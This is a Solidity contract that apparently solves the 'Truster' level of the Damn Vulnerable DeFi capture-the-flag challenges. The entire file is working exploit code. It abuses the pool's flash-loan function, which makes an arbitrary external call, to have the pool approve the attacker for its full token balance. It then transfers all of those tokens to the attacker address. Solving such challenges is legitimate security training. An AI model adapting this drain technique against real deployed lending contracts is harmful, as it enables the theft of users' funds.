// SPDX-License-Identifier: MIT

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

pragma solidity ^0.8.0;

contract TrusterLenderPoolExploit {
    function exploit(
        address payable _pool,
        address _token,
        address _attacker
    ) external {
        TrusterLenderPool pool = TrusterLenderPool(_pool);

        _token = pool.damnValuableToken();
        IERC20 token = IERC20(_token);
        uint256 fundsToDrain = token.balanceOf(_pool);

        pool.flashLoan(
            0,
            _attacker,
            _token,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                fundsToDrain
            )
        );

        token.transferFrom(_pool, _attacker, fundsToDrain);
    }
}
